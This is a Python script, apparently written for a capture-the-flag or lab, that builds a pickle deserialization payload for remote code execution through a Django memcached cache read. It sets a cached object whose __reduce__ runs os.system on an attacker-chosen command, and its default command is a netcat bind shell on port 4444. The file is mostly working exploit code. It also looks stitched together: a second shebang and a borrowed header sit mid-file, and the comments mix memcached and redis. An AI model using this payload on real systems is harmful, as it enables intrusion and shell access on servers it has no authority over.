import sys

# This file generates a suitable payload to get RCE in a django
# memached read.  To use, first run:
# nc -l 11212 > mypayload.memcached
# And then in another terminal, assuming you want the payload to open
# a calculator in macos:
# python set-cache.py 'open -a Calculator'
# To actually use mypayload.memcached, you'll have to put \r\n at the
# beginning of it, and load it into the redis instance `custom-tls`
# connects to.

from django.conf import settings
from django.conf.urls import url
from django.core.management import execute_from_command_line
from django.http import HttpResponse
from django.core.cache import cache

settings.configure(
    DEBUG=True,
    ROOT_URLCONF=sys.modules[__name__],
    CACHES = {
        'default': {
            'BACKEND': 'django.core.cache.backends.memcached.MemcachedCache',
            'LOCATION': '127.0.0.1:11212',
        },
    },
)

#!/usr/bin/python

# Credit: https://gist.github.com/mgeeky/cbc7017986b2ec3e247aab0b01a9edcd
#
# Pickle deserialization RCE payload.
# To be invoked with command to execute at it's first parameter.
# Otherwise, the default one will be used.
#

import pickle
import sys
import base64

DEFAULT_COMMAND = "netcat -c '/bin/bash -i' -l -p 4444"
COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(COMMAND,))

cache.set('page_hits', PickleRce())
